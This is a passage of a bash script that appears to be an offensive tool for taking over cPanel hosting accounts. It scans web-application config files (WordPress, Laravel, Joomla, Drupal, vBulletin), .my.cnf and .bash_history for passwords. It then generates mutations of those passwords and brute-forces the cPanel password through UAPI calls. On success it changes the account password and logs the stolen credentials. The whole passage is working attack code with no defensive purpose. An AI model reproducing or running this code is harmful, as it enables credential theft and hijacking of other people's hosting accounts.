extract_passwords() {
    log_section "PHASE 4: PASSWORD EXTRACTION (no root)"
    local found=0
    
    # ── WordPress ──
    log_info "Scanning WordPress..."
    while IFS= read -r f; do
        local p=$(grep -oP "DB_PASSWORD['\"],\s*['\"]?\K[^'\")]+" "$f" 2>/dev/null)
        [[ -n "$p" ]] && add_pass "$p" && log_crack "WP: ${Y}${p}${N} ${D}(${f##*/})${N}" && ((found++))
    done < <(find "${HOMEDIR}" -maxdepth 5 -name "wp-config.php" 2>/dev/null)
    
    # ── Laravel .env ──
    log_info "Scanning Laravel..."
    while IFS= read -r f; do
        grep -oP "^(DB_PASSWORD|MAIL_PASSWORD|REDIS_PASSWORD|AWS_SECRET)=\K.*" "$f" 2>/dev/null | tr -d "'\"" | while read p; do
            [[ -n "$p" && "$p" != "null" ]] && add_pass "$p" && log_crack "ENV: ${Y}${p}${N}" && ((found++))
        done
    done < <(find "${HOMEDIR}" -maxdepth 5 -name ".env" 2>/dev/null)
    
    # ── vBulletin ──
    log_info "Scanning vBulletin..."
    while IFS= read -r f; do
        local p=$(grep -oP "\[.password.\]\s*=\s*['\"]?\K[^'\";]+" "$f" 2>/dev/null | head -1)
        [[ -n "$p" ]] && add_pass "$p" && log_crack "vB: ${Y}${p}${N}" && ((found++))
    done < <(find "${HOMEDIR}" -maxdepth 5 -path "*/includes/config.php" 2>/dev/null | head -20)
    
    # ── Joomla ──
    log_info "Scanning Joomla..."
    while IFS= read -r f; do
        local p=$(grep -oP "password\s*=\s*['\"]?\K[^'\";]+" "$f" 2>/dev/null | head -1)
        [[ -n "$p" ]] && add_pass "$p" && log_crack "Joomla: ${Y}${p}${N}" && ((found++))
    done < <(find "${HOMEDIR}" -maxdepth 5 -name "configuration.php" 2>/dev/null)
    
    # ── Drupal ──
    while IFS= read -r f; do
        local p=$(grep -oP "'password'\s*=>\s*'?\K[^',]+" "$f" 2>/dev/null | head -1)
        [[ -n "$p" ]] && add_pass "$p" && log_crack "Drupal: ${Y}${p}${N}" && ((found++))
    done < <(find "${HOMEDIR}" -maxdepth 5 -path "*/sites/default/settings.php" 2>/dev/null)
    
    # ── Generic DB configs ──
    log_info "Scanning generic configs..."
    while IFS= read -r f; do
        grep -oiP "(?:pass(?:word)?|pwd)\s*[=:>]\s*['\"]?\K[^'\"\s;,<]+" "$f" 2>/dev/null | head -5 | while read pw; do
            [[ -n "$pw" && ${#pw} -ge 4 && ${#pw} -le 64 ]] && add_pass "$pw"
        done
    done < <(find "${HOMEDIR}" -maxdepth 4 \( -name "config.php" -o -name "config.inc.php" -o -name "db.php" -o -name "database.php" -o -name "settings.php" -o -name "conn.php" -o -name "local.xml" -o -name "env.php" \) 2>/dev/null | head -30)
    
    # ── .my.cnf ──
    [[ -f "${HOMEDIR}/.my.cnf" ]] && {
        local p=$(grep -oP "password\s*=\s*\K.*" "${HOMEDIR}/.my.cnf" 2>/dev/null | tr -d '"'"'" | head -1)
        [[ -n "$p" ]] && add_pass "$p" && log_crack ".my.cnf: ${Y}${p}${N}" && ((found++))
    }
    
    # ── .bash_history ──
    grep -oP "(?:password|passwd|pass|pw)[=: ]+['\"]?\K[^'\"\s;|&]+" "${HOMEDIR}/.bash_history" 2>/dev/null | sort -u | while read p; do
        [[ -n "$p" && ${#p} -ge 4 ]] && add_pass "$p"
    done
    
    log_ok "Extracted ${G}${#PASSWORDS[@]}${N} unique passwords"
}

generate_variations() {
    log_section "PHASE 5: PASSWORD MUTATIONS"
    local base=("${PASSWORDS[@]}")
    
    for p in "${base[@]}"; do
        add_pass "$(echo "$p" | tr '[:upper:]' '[:lower:]')"
        add_pass "$(echo "$p" | tr '[:lower:]' '[:upper:]')"
        add_pass "$(echo "$p" | sed 's/./\U&/')"
        for s in "" "!" "@" "#" "1" "123" "2025" "2026"; do
            add_pass "${p}${s}"
        done
        add_pass "@${p}"
        add_pass "$(echo "$p" | sed 'y/aeiost/431057/')"
        add_pass "$(echo "$p" | tr -d '@!#$%^&*')"
    done
    
    # Defaults
    for p in "${CPUSER}" "${CPUSER}123" "${CPUSER}!" "password" "Password1" "P@ssw0rd" "admin123" "Admin@123" "changeme" "123456"; do
        add_pass "$p"
    done
    
    log_ok "Total candidates: ${G}${#PASSWORDS[@]}${N}"
}

bruteforce_cpanel() {
    log_section "PHASE 6: BRUTE FORCE (cPanel UAPI)"
    local total=${#PASSWORDS[@]}
    log_info "Testing ${W}${total}${N} passwords..."
    echo ""
    
    for i in "${!PASSWORDS[@]}"; do
        local pass="${PASSWORDS[$i]}"
        local num=$((i + 1))
        local pct=$((num * 100 / total))
        printf "\r  ${D}[${N}${G}"
        local filled=$((pct / 5))
        for ((f=0;f<filled;f++)); do printf "█"; done
        for ((f=filled;f<20;f++)); do printf "${D}░"; done
        printf "${D}]${N} ${W}%3d%%${N} ${D}(%d/%d)${N} ${Y}%.25s${N}   " "$pct" "$num" "$total" "$pass"
        
        ((TRIED++))
        local r=$(uapi ContactInformation set_email_addresses address="test@test.com" password="${pass}" 2>&1)
        
        if echo "$r" | grep -q "status: 1"; then
            FOUND_PASS="$pass"
            echo ""
            echo ""
            echo -e "  ${BG_G}${W}  ★ PASSWORD CRACKED: ${FOUND_PASS}  ${N}"
            echo ""
            SUCCESS=1
            
            # Post-exploit: try to change password
            (echo "${FOUND_PASS}"; echo "${NEW_PASS}"; echo "${NEW_PASS}") | passwd 2>/dev/null
            log_result "cPanel|${CPUSER}|${FOUND_PASS} → ${NEW_PASS}|https://$(hostname):2083"
            return 0
        fi
    done
    
    echo ""
    echo ""
    log_fail "All ${total} passwords failed."
    return 1
}

